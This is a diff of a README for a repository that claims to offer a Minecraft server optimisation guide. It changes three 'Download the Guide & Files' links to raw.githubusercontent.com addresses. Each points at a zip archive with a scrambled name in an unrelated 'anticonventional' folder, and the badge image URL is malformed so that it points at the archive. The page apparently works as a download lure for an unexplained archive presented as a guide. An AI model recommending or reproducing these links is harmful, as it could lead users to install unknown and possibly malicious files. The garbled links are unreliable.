@@ -1,6 +1,6 @@
 # ⚙️ optimize-minecraft-server-the-complete-guide - Boost Your Minecraft Server Performance
 
-[![Download Now](https://github.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/raw/refs/heads/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip%20Guide-blue?style=for-the-badge)](https://github.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/raw/refs/heads/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
+[![Download Now](https://raw.githubusercontent.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip%20Guide-blue?style=for-the-badge)](https://raw.githubusercontent.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Having enough RAM and a good CPU helps, but many improvements come from optimizi
 
 To get started, visit this page to download the complete guide and files:
 
-[Download the Guide & Files](https://github.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/raw/refs/heads/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
+[Download the Guide & Files](https://raw.githubusercontent.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
 
 ### How to download the guide:
 
@@ -149,4 +149,4 @@ This guide prepares you to handle most situations confidently.
 
 ---
 
-[Download the Guide & Files](https://github.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/raw/refs/heads/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
+[Download the Guide & Files](https://raw.githubusercontent.com/masindeashiraf/optimize-minecraft-server-the-complete-guide/main/anticonventional/minecraft-the-server-complete-optimize-guide-v3.3.zip)
